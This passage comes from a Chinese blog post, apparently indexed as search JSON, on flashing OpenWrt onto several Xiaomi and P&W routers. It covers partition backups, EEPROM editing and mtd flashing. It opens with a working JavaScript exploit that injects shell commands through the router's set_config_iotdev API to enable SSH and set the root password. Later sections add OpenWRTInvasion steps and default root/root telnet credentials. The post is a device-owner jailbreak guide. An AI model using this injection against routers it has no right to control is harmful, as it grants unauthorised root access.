match = location.href.match(/;stok=(.*?)\\//);\n    if (!match) {\n        return null;\n    }\n    return match[1];\n}\n\nfunction execute(stok, command) {\n    command = encodeURIComponent(command);\n    let path = `/cgi-bin/luci/;stok=${stok}/api/misystem/set_config_iotdev?bssid=SteelyWing&amp;user_id=SteelyWing&amp;ssid=-h%0A${command}%0A`;\n    console.log(path);\n    return fetch(new Request(location.origin + path));\n}\n\nfunction enableSSH() {\n    stok = getSTOK();\n    if (!stok) {\n        console.error('stok not found in URL');\n        return;\n    }\n    console.log(`stok = \"${stok}\"`);\n\n    password = prompt('Input new SSH password');\n    if (!password) {\n        console.error('You must input password');\n        return;\n    }\n\n    execute(stok, \n`\nnvram set ssh_en=1\nnvram commit\nsed -i 's/channel=.*/channel=\\\\\"debug\\\\\"/g' /etc/init.d/dropbear\n/etc/init.d/dropbear start\n`\n    )\n        .then((response) =&gt; response.text())\n        .then((text) =&gt; console.log(text));\n    console.log('New SSH password: ' + password);\n    execute(stok, `echo -e \"${password}\\\\n${password}\" | passwd root`)\n        .then((response) =&gt; response.text())\n        .then((text) =&gt; console.log(text));\n}\n\nenableSSH();\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#3-\u4e0b\u8f7dopenwrt\u955c\u50cf","title":"3. \u4e0b\u8f7dopenwrt\u955c\u50cf","text":"<p>\u4ece\u5b98\u65b9\u4e0b\u8f7d\u6700\u65b0\u955c\u50cf\uff0c\u6ce8\u610f\u6709\u56db\u4e2a\u6587\u4ef6</p> <ul> <li>kernel: \u5177\u6709\u6700\u5c11\u6587\u4ef6\u7cfb\u7edf\u7684Linux\u5185\u6838. \u5bf9\u4e8e\u9996\u6b21\u5b89\u88c5\u6216\u6062\u590d\u5f88\u6709\u7528.</li> <li>kernel1: Linux\u5185\u6838\u4f5c\u4e3a\u5355\u72ec\u7684\u6620\u50cf</li> <li>rootfs0: \u6839\u6587\u4ef6\u7cfb\u7edf\u4f5c\u4e3a\u5355\u72ec\u7684\u6620\u50cf.</li> <li>Sysupgrade: \u4f7f\u7528Sysupgrade\u6620\u50cf\u66f4\u65b0\u5df2\u7ecf\u8fd0\u884cOpenWrt\u7684\u8def\u7531\u5668. \u8be5\u6620\u50cf\u53ef\u4ee5\u4e0eLuCI Web\u754c\u9762\u6216\u7ec8\u7aef\u4e00\u8d77\u4f7f\u7528.</li> </ul> <p>\u9700\u8981\u4e0b\u8f7dkernel1\u548crootfs0</p> <ul> <li>OpenWrt Downloads</li> <li>OpenWrt Firmware Selector</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#4-\u5907\u4efd","title":"4. \u5907\u4efd","text":"<p>\u901a\u8fc7dmesg\uff0c\u77e5\u9053\u4e00\u5171\u670914\u4e2amtd\u5206\u533a</p> <pre><code>[    2.940000] NAND device: Manufacturer ID: 0xc8, Chip ID: 0xd1 (ESMT NAND 128MiB 3,3V 8-bit), 128MiB, page size: 2048, OOB size: 64\n[    2.950000] [NAND]select ecc bit:4, sparesize :64 spare_per_sector=16\n[    2.950000] Scanning device for bad blocks\n[    3.100000] Signature matched and data read!\n[    3.110000] load_fact_bbt success 1023\n...\n[    3.190000] Creating 14 MTD partitions on \"MT7621-NAND\":\n[    3.190000] 0x000000000000-0x000007f80000 : \"ALL\"\n[    3.200000] 0x000000000000-0x000000080000 : \"Bootloader\"\n[    3.210000] 0x000000080000-0x0000000c0000 : \"Config\"\n[    3.210000] 0x0000000c0000-0x000000100000 : \"Bdata\"\n[    3.220000] 0x000000100000-0x000000140000 : \"Factory\"\n[    3.230000] 0x000000140000-0x000000180000 : \"crash\"\n[    3.230000] 0x000000180000-0x0000001c0000 : \"crash_syslog\"\n[    3.240000] 0x0000001c0000-0x000000200000 : \"cfg_bak\"\n[    3.240000] 0x000000200000-0x000000600000 : \"kernel0\"\n[    3.250000] 0x000000600000-0x000000a00000 : \"kernel1\"\n[    3.260000] 0x000000a00000-0x000002400000 : \"rootfs0\"\n[    3.260000] 0x000002400000-0x000003e00000 : \"rootfs1\"\n[    3.270000] 0x000003e00000-0x000006400000 : \"overlay\"\n[    3.280000] 0x000006400000-0x000007f80000 : \"obr\"\n[    3.280000] [mtk_nand] probe successfully!\n</code></pre> <p>\u901a\u8fc7cat /proc/mtd\uff0c\u77e5\u9053\u5bf9\u5e94\u5173\u7cfb</p> <pre><code>root@XiaoQiang:/tmp# cat /proc/mtd\ndev:    size   erasesize  name\nmtd0: 07f80000 00020000 \"ALL\"\nmtd1: 00080000 00020000 \"Bootloader\"\nmtd2: 00040000 00020000 \"Config\"\nmtd3: 00040000 00020000 \"Bdata\"\nmtd4: 00040000 00020000 \"Factory\"\nmtd5: 00040000 00020000 \"crash\"\nmtd6: 00040000 00020000 \"crash_syslog\"\nmtd7: 00040000 00020000 \"cfg_bak\"\nmtd8: 00400000 00020000 \"kernel0\"\nmtd9: 00400000 00020000 \"kernel1\"\nmtd10: 01a00000 00020000 \"rootfs0\"\nmtd11: 01a00000 00020000 \"rootfs1\"\nmtd12: 02600000 00020000 \"overlay\"\nmtd13: 01b80000 00020000 \"obr\"\nmtd14: 00c1c000 0001f000 \"ubi_rootfs\"\nmtd15: 021e8000 0001f000 \"data\"\n</code></pre> <p>\u5907\u4efd\uff0c\u5176\u4e2dFactory\u4e2d\u5b58\u50a8\u4e86EEPROM\u7684\u6570\u636e</p> <pre><code>cat /dev/mtd4 &gt; Factory.dump\n\nscp\u590d\u5236\u5230\u672c\u5730\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#5-\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf","title":"5. \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf","text":"<p>\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff08rm2100\u6709\u53cc\u7cfb\u7edf\u7528\u4e8e\u5907\u4efd\u4fdd\u62a4\uff0c\u9700\u8981\u8bbe\u7f6e\u5148\u542f\u52a8\u54ea\u4e00\u4e2a\uff09</p> <pre><code># Enable uart and boot_wait, useful for testing or recovery if you have an uart adapter!\nnvram set uart_en=1\nnvram set boot_wait=on\nnvram set bootdelay=5\n\n# Set kernel1 as the booting kernel\nnvram set flag_try_sys1_failed=1\n\n# Commit our nvram changes\nnvram commit\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#6-\u5237\u673a","title":"6. \u5237\u673a","text":"<pre><code>mtd write kernel1.bin kernel1\nmtd -r write rootfs0.bin rootfs0\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#mi-4a\u5343\u5146\u7248","title":"MI 4A\u5343\u5146\u7248","text":"<p>\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] Xiaomi Mi Router 4A Gigabit Edition</p> <p>warning - 2022/10\uff1av2\u7248\u672c\u76844A\u5343\u5146\u7248\u65e0\u6cd5\u5237op\u3002\u539f\u7248\u4f7f\u7528\u7684\u662fWinbond or GigaDevice\u7684flash\u82af\u7247\uff0c\u6211\u624b\u5934\u7684\u662fGigaDevice\u7684GD25Q127CSIG \u3002\u65b0\u7248\u4f7f\u7528\u00a0Eon or CFeon\u7684\u82af\u7247\uff0c\u8fd8\u5728\u652f\u6301\u4e2d\u3002 - \u8001\u7248\u7684\u6709\u65e0\u7ebf\u5c4f\u853d\uff0c\u800c\u5728\u552e\u7684\u6ca1\u6709</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u53ef\u4ee5\u6f0f\u6d1e\u83b7\u53d6shell\uff0c\u4e0d\u5fc5\u4f7f\u7528\u786c\u4ef6\u7f16\u7a0b\u5668</p> <p>2022/11/6\u65e5\uff0c\u56e0\u5237breed bootloader\uff0c\u4f7f\u5f97MI 4A\u53d8\u7816\u3002\u5fe0\u544a\uff1a\u522b\u7528breed\uff0c\u4f1a\u53d8\u5f97\u4e0d\u5e78\u3002\uff08\u4f60tm\u652f\u6301r3g\uff0c\u4e0d\u652f\u6301mi 4a\u80fd\u4e0d\u80fd\u5199\u6e05\u695a\uff09</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6b65\u9aa4","title":"\u6b65\u9aa4","text":"<p>~~1. \u9996\u5148\u9700\u8981\u4f7f\u7528<code>OpenWRTInvasion</code>\u83b7\u53d6shell\u3002\u53c2\u8003\uff1aacecilia/OpenWRTInvasion(github.com)\u3002</p> <p>~~\u540c\u65f6\uff0c\u8be5\u4ed3\u5e93\u4e5f\u63d0\u4f9b\u4e86\u83b7\u5f97shell\u540e\u7684\u5237\u673a\u8fc7\u7a0b\u3002\u4e0d\u8fc7\u4f7f\u7528\u5b98\u65b9\u7684<code>OpenWRTInvasion</code>\u4f1a\u4ecegithub\u4e0a\u4e0b\u8f7d\u6587\u4ef6\uff0c\u800c\u56e0\u4e3a\u7f51\u7edc\u539f\u56e0\u53ef\u80fd\u4f1a\u5931\u8d25\u3002\u6069\u5c71\u8bba\u575b\u4e2d\u6709\u7528\u6237\u63d0\u4f9b\u4e86\u4fee\u6539\u4ee3\u7801\u7684\u79bb\u7ebf\u7248\u672c\uff0c\u53ef\u4ee5\u641c\u7d22\u4f7f\u7528\u3002 \u4e0d\u8fc7\u4e5f\u53ef\u4ee5\u81ea\u884c\u4fee\u6539\u4ee3\u7801\uff1a\u4fee\u6539<code>script.sh</code>\uff0c\u5c06\u5176\u4e2d\u7684\u94fe\u63a5\u66ff\u6362\u6210\u672c\u5730\u94fe\u63a5\u3002\u53ef\u4ee5\u4f7f\u7528python -m http.server\u8fd0\u884c\u4e00\u4e2a\u5c0f\u7684http\u670d\u52a1\uff0c\u63d0\u4f9b\u4e0b\u8f7d\u3002\u4f8b\uff1a    <pre><code>curl -L \"https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel\" --insecure --output busybox\n\n#\u6539\u4e3a,ip\u9700\u8981\u8c03\u6574\ncurl \"http://192.168.31.189:8000/busybox-mipsel\" --output busybox\n</code></pre></p> <ol> <li>\u73b0\u5728\u5b98\u65b9\u4ed3\u5e93\u96c6\u6210\u4e86\u672c\u5730\u670d\u52a1\u5668\u7684\u529f\u80fd\uff0c\u76f4\u63a5\u8fd0\u884c\u811a\u672c\u5373\u53ef\u3002\u4f46\u662f\u5b98\u65b9\u4ed3\u5e93\u5374\u653e\u5f03\u4e86\u5bf9windows\u7684\u652f\u6301\uff0c\u4e0d\u8fc7\u4eb2\u6d4b\u5728git bash\u4e2d\u8fd0\u884c\u6ca1\u6709\u95ee\u9898\uff0c\u53ea\u9700\u8981\u628a\u811a\u672c\u5f00\u5934\u7684\u68c0\u6d4b\u6ce8\u91ca\u6389\u5373\u53ef\u3002 <pre><code># if platform.system() == \"Windows\":\n# \u00a0 \u00a0 sys.exit(\"Stopping: script can only be run on a Mac/Linux system\")\n</code></pre></li> <li>\u4e4b\u540e\u4f7f\u7528telnet\u8fdb\u884c\u8fde\u63a5\uff0c\u6210\u529f\u83b7\u5f97shell\u5982\u56fe\u6240\u793a <pre><code>telnet 192.168.31.1 #\u8d26\u53f7root, \u5bc6\u7801root\n</code></pre> </li> <li>\u63a5\u7740\u4e0a\u4f20openwrt\u955c\u50cf(\u4f7f\u7528sysupgrade bin)\u5230\u8def\u7531\u5668\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528python\u642d\u5efahttp\u6587\u4ef6\u670d\u52a1\u5668\u3002\u6700\u540e\u8fd0\u884cmtd\u7b49\u5f85\u8def\u7531\u5668\u91cd\u542f\u5b8c\u6210\u5373\u53ef\u3002 <pre><code>#window\u4e0a, sysupgrade.bin\u6240\u5728\u76ee\u5f55\npython -m http.server\n\n#\u8def\u7531\u5668\u4e0a\ncd /tmp\ncurl -O http://&lt;windows ip&gt;:8000/sysupgrade.bin\nmtd -e OS1 -r write sysupgrade.bin OS1\n</code></pre></li> </ol>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>breed\u4f7f\u7528\u8bf4\u660e\uff1ahttps://www.sohu.com/a/304140654_120096961 breed\u5237openwrt\u6559\u7a0bhttps://www.ixigua.com/6974624328725824031</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#eeprom\u4e0b\u8f7d","title":"EEPROM\u4e0b\u8f7d","text":"<p>eeprom\u91cc\u6709mac\u548csn\u7b49\u4fe1\u606f\uff0c\u5982\u679csn\u4e22\u5931\u5237\u5b98\u65b9bootloader\u5237\u56de\u539f\u5382\u4e5f\u4e0d\u80fd\u7ed1\u5b9a\u624b\u673aapp\u7684</p> <ul> <li>\u3010\u65b0\u63d0\u9192\u3011[20210919\u66f4\u65b0]\u5c0f\u7c73\u8def\u75314A\u5343\u5146\u7248LEDE\u56fa\u4ef6_\u96c6\u6210\u5feb\u4e50\u4e0a\u7f51\u3001\u5185\u7f51\u7a7f\u900f\u3001KMS\u3001\u7f51\u7edc\u52a0\u901f-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</li> </ul> <p>\u6211\u770b\u4e86\u4e0b\u679c\u7136\u662f\u9519\u7684\uff0c\u6211\u4e4b\u524d\u4e5f\u662f\u8fd9\u4e2a\u60c5\u51b5\uff0c\u540e\u6765\u5206\u6790\u4e86\u4e0b\u628aeeprom\u7528\u4e0a\u4e86\u6b63\u786e\u7684\u5c31\u597d\u4e86\uff0c\u4f60\u5237\u6211\u8fd9\u4e2aeeprom\uff0c\u5982\u679c\u8fd8\u4e0d\u884c\u5c31\u5237\u6211\u7684\u89e3\u9501\u5206\u533a\u7684lede\u56fa\u4ef6\uff0c\u7528mtd\u547d\u4ee4\u5237\u5199\uff0cssh\u4e0a\u8def\u7531\uff0c\u672c\u5730scp\u547d\u4ee4\u62f7\u8d1d\u4e0a\u4f20\u5230tmp\u76ee\u5f55\uff0c   mtd -r write /tmp/eeprom.bin factory \u91cd\u542f\u5b8c\u4e86\u5c31ok \u5237\u5b8cmac\u4f1a\u53d8\uff0c\u628a\u4f60\u7684mac\u5730\u5740\u6539\u6210\u4f60\u539f\u6765\u7684mac\u5730\u5740\u3002 \u5982\u679c\u6709\u539f\u6765\u7684\u56fa\u4ef6\u5907\u4efd\uff0c\u53d1\u6211\u6211\u6765\u5e2e\u4f60\u63d0\u53d6</p> <ul> <li>\u3010\u65b0\u63d0\u9192\u3011\u5e2e\u52a9\u63d0\u53d6eeprom\u5c0f\u7c734A\u5343\u5146(22\u5e748\u6708\u65b0\u7248)-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#eeprom\u4fee\u6539","title":"EEPROM\u4fee\u6539","text":"<p>\u3010\u65b0\u63d0\u9192\u3011\u5173\u4e8e\u65b03(newifi 3)\u7684eeprom\u6587\u4ef6\u4e2dMAC-SN\u7b49\u53c2\u6570\u4f4d\u7f6e-newifi\u65e0\u7ebf\u8def\u7531\u5668\u53ca\u7f51\u7edc\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <p>\u7528SSH\u767b\u5f55\u8fdb\u5165\u8def\u7531\u5668\u7684Console\u53f0\u540e\uff0c\u7528\u547d\u4ee4(cat /proc/mtd)\u7684\u8f93\u51fa\u4e2d\uff0cFactory\u533a\u5bf9\u5e94\u7684\u5c31\u662f\u65e0\u7ebf\u548cMAC/SN\u7b49\u7684\u914d\u7f6e\u6587\u4ef6\u3002 \u8fd9\u4e2a\u6587\u4ef6\u5907\u4efd\u51fa\u6765\u540e\uff0c\u5927\u5c0f\u4e3a64KB\uff0c\u53ef\u4ee5\u5728breed\u4e2d\u66f4\u65b0eeprom\u5904\u5237\u5165\u8def\u7531\u5668\u3002</p> <p>(\u4e0b\u56fe\u4e3a\u89e3\u9501\u540e\u7684\u8f93\u51fa) \u7528WinHex\u6253\u5f00\u5907\u4efd\u7684\u6587\u4ef6(\u5047\u8bbe\u4e3aeeprom.bin)</p> <p>1)     \u8def\u7531\u5668\u7684SN \u8def\u7531\u5668\u7684SN\u53f7\u5728\u8def\u7531\u5668\u7684\u80cc\u9762\u8d34\u7eb8\u5904\u6709\uff0cSN\u7684\u5b58\u50a8\u5728\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u7684\u504f\u79fb0x7000(\u5904)\uff0c\u683c\u5f0f\u4e3a\u4ee5MND\u5f00\u5934\uff0c\u5982\u4e0b\uff1a</p> <p>2)     \u8def\u7531\u5668\u7684MAC\u5730\u5740 \u8def\u7531\u5668\u7684MAC\u53f7\u5728\u8def\u7531\u5668\u7684\u80cc\u9762\u8d34\u7eb8\u5904\u6709\uff0cMAC\u7684\u5b58\u50a8\u5728\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u7684\u504f\u79fb0xE000(\u5904)\uff0c\u683c\u5f0f\u4e3a\u8fde\u7eed\u7684\u4e24\u4e2aMAC\u5730\u5740\uff0c\u5171\u536012\u5b57\u8282\u3002 \u5206\u522b\u4e3a\u8d77\u59cb\u201dMAC\u5730\u5740-\u7ed3\u675fMAC\u5730\u5740\u201d, \u7ed3\u675fMAC\u5730\u5740\u4e3a\u8d77\u59cbMAC\u5730\u5740\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5185\u5bb9+2. \u5982\u56fe\uff1a \u8d77\u59cbMAC\u5730\u5740\uff1a20 76 93 48 A9 1F (\u8def\u7531\u5668\u80cc\u9762\u5904\u7684\u8d34\u7eb8) \u7ed3\u675fMAC\u5730\u5740\uff1a20 76 93 48 A9 21</p> <p>3)     \u548c\u65e0\u7ebf\u6709\u5173\u7684\u53c2\u6570 2.4G\u65e0\u7ebf\u7684BSSID\u5728\u6587\u4ef6\u5f00\u5934\u504f\u79fb0x4-0x9\u5904\uff0c\u603b\u51716\u5b57\u8282\uff0c\u5982\u4e0b\u56fe\u6240\u793a:</p> <p>5G\u65e0\u7ebf\u7684BSSID\u5728\u504f\u79fb0x8004-0x8009\u5904\uff0c\u603b\u51716\u5b57\u8282, (2.4G\u65e0\u7ebf\u7684BSSID\u4e0e5G-BSSID\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5185\u5bb9\u76f8\u5dee2)\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p>\u548c\u65e0\u7ebf\u6709\u5173\u7684\u53c2\u6570\u5e94\u8be5\u662f\u5728\u504f\u79fb0x8000-0x80C0\u5904\u3002\u770b\u7f51\u53cb\u4eec\u6539\u7684\u8bdd\uff0c\u90fd\u662f\u57280x8060-0x809F\u8fd9\u4e09\u884c\u4e0a\u4fee\u6539\uff0c\u7531\u4e8e\u6ca1\u6709\u5177\u4f53\u8bf4\u660e\u53c2\u6570\u542b\u4e49\uff0c\u56e0\u6b64\u4e0d\u63a8\u8350\u81ea\u5df1\u4fee\u6539\u3002 \u5982\u56fe\u6240\u793a\uff1a</p> <p>4) \u672a\u77e5\u7684\u5185\u5bb9</p> <p>\u6587\u4ef6\u5f00\u5934\u76840x56-0x61\u504f\u79fb\u5904\uff0c\u4e00\u517112\u5b57\u8282\uff0c\u5206\u4e3a2\u7ec4\u3002\u524d6\u5b57\u8282\u548c\u540e6\u5b57\u8282\u5185\u5bb9\u4e5f\u6bd4\u8f83\u76f8\u4f3c\u3002\u4e0d\u662fmac\u4e5f\u4e0d\u662fbssid.</p> <p>\u53e6\u5916\u5728\u504f\u79fb0x8060-0x80A0\u51714\u884c\u5185\uff0c\u6709\u51e0\u4e2a\u53c2\u6570\u662f\u4ee55\u4e2a\u5b57\u8282\u4e3a\u4e00\u7ec4\u7684\u53c2\u6570\uff0c\u5177\u4f53\u683c\u5f0f\u7279\u5f81\u5982\u4e0b\uff1a 00 00 26 xx xx, \u6216\u8005 00 01 26 xx xx, \u6216\u800500 02 26 xx xx \u7b49\u3002</p> <p>\u5efa\u8bae:     \u53ef\u4ee5\u7528\u5176\u5b83\u4eba\u7684EEPROM\u56fa\u4ef6\uff0c\u4ec5\u4ec5\u4fee\u6539MAC\u548cSN (\u53ef\u9009\uff1aBSSID)\u4e3a\u81ea\u5df1\u7684\u8def\u7531\u5668\u7684\u5373\u53ef\uff0c\u4e0d\u63a8\u8350\u81ea\u5df1\u4fee\u6539\u65e0\u7ebf\u53c2\u6570\u90e8\u5206\u5185\u5bb9\u3002</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#mi-r3g","title":"MI R3G","text":"<p>\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] Xiaomi Mi WiFi R3G (Mi Wifi Router 3G / MIR3G / MI3G / mi4a Gigabit)</p> <p>r3g\u5b98\u65b9\u56fa\u4ef6\u4e0b\u8f7d\uff1aOpenWrt Firmware Selector</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u51c6\u5907","title":"\u51c6\u5907","text":"<ul> <li>FAT32\u683c\u5f0fU\u76d8</li> <li>\u4e00\u679a\u9488\u7528\u4e8e\u6233\u8def\u7531\u5668reset\u952e</li> <li>\u624b\u673a\u5b89\u88c5MIWIFI app</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5f00\u542fssh","title":"\u5f00\u542fssh","text":"<ol> <li> <p>\u66f4\u65b0\u4e3a\u5c0f\u7c73\u5f00\u53d1\u7248\u56fa\u4ef6\uff1ahttps://bigota.miwifi.com/xiaoqiang/rom/r3g/miwifi_r3g_firmware_12f97_2.25.124.bin</p> </li> <li> <p>\u4e0b\u8f7d\u5c0f\u7c73\u8def\u7531\u5668\u624b\u673a\u5ba2\u6237\u7aef(\u5e94\u7528\u5546\u5e97MI WIFI)\u8f6f\u4ef6\uff0c\u7ed1\u5b9a\u8def\u7531\u5668</p> </li> <li> <p>\u6839\u636ehttps://d.miwifi.com/rom/ssh\uff0c\u5f00\u542fSSH</p> </li> </ol> <p>p.s. 1. \u5373\u4f7f\u662f\u540c\u4e00\u578b\u53f7\uff0cmiwifi_ssh.bin\u4e5f\u662f\u4e0d\u540c\u7684\uff1b2. ssh\u5bc6\u7801\u663e\u793a\u5728\u8be5\u9875\u9762</p> <ol> <li>\u8bf7\u5c06\u4e0b\u8f7d\u7684\u5de5\u5177\u5305bin\u6587\u4ef6\u590d\u5236\u5230U\u76d8\uff08FAT/FAT32\u683c\u5f0f\uff09\u7684\u6839\u76ee\u5f55\u4e0b\uff0c\u4fdd\u8bc1\u6587\u4ef6\u540d\u4e3amiwifi_ssh.bin\uff1b</li> <li>\u65ad\u5f00\u5c0f\u7c73\u8def\u7531\u5668\u7684\u7535\u6e90\uff0c\u5c06U\u76d8\u63d2\u5165USB\u63a5\u53e3\uff1b</li> <li>\u6309\u4f4freset\u6309\u94ae\u4e4b\u540e\u91cd\u65b0\u63a5\u5165\u7535\u6e90\uff0c\u6307\u793a\u706f\u53d8\u4e3a\u9ec4\u8272\u95ea\u70c1\u72b6\u6001\u5373\u53ef\u677e\u5f00reset\u952e\uff1b</li> <li>\u7b49\u5f853-5\u79d2\u540e\u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\uff0c\u5c0f\u7c73\u8def\u7531\u5668\u4f1a\u81ea\u52a8\u91cd\u542f\uff0c\u4e4b\u540e\u60a8\u5c31\u53ef\u4ee5\u5c3d\u60c5\u6298\u817e\u5566 \uff1a\uff09</li> </ol>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5907\u4efd","title":"\u5907\u4efd","text":"<p>\u67e5\u770bmtd\u5206\u533a</p> <pre><code>root@XiaoQiang:~# cat /proc/mtd\ndev:    size   erasesize  name\nmtd0: 07f80000 00020000 \"ALL\"\nmtd1: 00080000 00020000 \"Bootloader\"\nmtd2: 00040000 00020000 \"Config\"\nmtd3: 00040000 00020000 \"Bdata\"\nmtd4: 00040000 00020000 \"Factory\"\nmtd5: 00040000 00020000 \"crash\"\nmtd6: 00040000 00020000 \"crash_syslog\"\nmtd7: 00040000 00020000 \"reserved0\"\nmtd8: 00400000 00020000 \"kernel0\"\nmtd9: 00400000 00020000 \"kernel1\"\nmtd10: 02000000 00020000 \"rootfs0\"\nmtd11: 02000000 00020000 \"rootfs1\"\nmtd12: 03580000 00020000 \"overlay\"\nmtd13: 012a6000 0001f000 \"ubi_rootfs\"\nmtd14: 030ec000 0001f000 \"data\"\n</code></pre> <p>\u5907\u4efdfactory\u5206\u533a</p> <pre><code>cat /dev/mtd4 &gt; /tmp/factory.bin\n\n#on windows\nscp root@192.168.33.193:/tmp/factory.bin .\nscp root@192.168.33.228:/tmp/factory.bin .\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237openwrt","title":"\u5237openwrt","text":"<pre><code>mtd write openwrt-18.06.2-ramips-mt7621-mir3g-squashfs-kernel1.bin kernel1\nmtd write openwrt-18.06.2-ramips-mt7621-mir3g-squashfs-rootfs0.bin rootfs0\nnvram set flag_try_sys1_failed=1\nnvram commit\nreboot\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#ax6s","title":"AX6S","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6b65\u9aa4_1","title":"\u6b65\u9aa4","text":"<p>YangWang92/AX6S-unlock (github.com)</p> <ul> <li>telnet\u540e\u624b\u52a8\u5f00\u542fssh   <pre><code>/etc/init.d/dropbear start\n</code></pre>   \u200b tips: \u4f7f\u7528git-bash\u7248\u672c\u7684ssh\u8fde\u63a5\u62a5\u9519\u3002\u4f7f\u7528cmd\u7684ssh\u53ef\u4ee5\u3002   <pre><code>Unable to negotiate with 192.168.31.1 port 22: no matching host key type found. Their offer: ssh-rsa\n</code></pre></li> <li>\u5fc5\u987b\u6dfb\u52a0boot_fw1\u6539\u884c\uff0c\u5426\u5219\u91cd\u542f\u540e\u8fdb\u5165\u539f\u7cfb\u7edf\u3002   <pre><code>nvram set ssh_en=1\nnvram set uart_en=1\nnvram set boot_wait=on\nnvram set flag_boot_success=1\nnvram set flag_try_sys1_failed=0\nnvram set flag_try_sys2_failed=0\nnvram set \"boot_fw1=run boot_rd_img;bootm\"\nnvram commit\n</code></pre></li> <li>\u5237\u5199factory.bin-&gt; firmware\u5206\u533a</li> </ul> <p>AX6S\u4e3a\u56fd\u5185\u7248\uff0c\u56fd\u5916\u7248\u79f0\u4e3aAX3200 - SoC\uff1aMT7622B: 2 x A53@1.35GHz CPU\u3002   - \u6ee1\u8840\u7248\u672c\u662fMT7622A\uff0c\u5c11\u4e86\u84dd\u7259\u5c31\u662fMT7622BV\uff0c\u6ca1\u6709\u84dd\u7259\u548c\u591a\u5a92\u4f53\u529f\u80fd\u7684\u662fMT7622B\uff0c\u57fa\u672c\u5269\u4e0b\u65e0\u7ebf\u529f\u80fd\u7684\u662fMT7622E -  ram: 256 + flash: 128 - [OpenWrt Wiki] Xiaomi AX3200 / Redmi AX6S</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u7ade\u6597\u4e9120pw","title":"\u7ade\u6597\u4e912.0\uff08P&amp;W)","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u8d44\u6599","title":"\u8d44\u6599","text":"<p>[OpenWrt Wiki] P&amp;W R619AC</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6559\u7a0b","title":"\u6559\u7a0b","text":"<p>\u9700\u8981\u5148\u5237\u5165opboot\uff08\u4e00\u4e2a\u7b2c\u4e09\u65b9bootloader\uff09\u7ade\u6597\u4e912\u5237opboot - \u8def\u7531\u667a\u6001 (red-yellow.net)</p> <p>\u7136\u540e\u518d\u5237openwrt\u3002 \u7f16\u8bd1\uff1a\u7ade\u6597\u4e912\u7684OpenWrt\u56fa\u4ef6 - 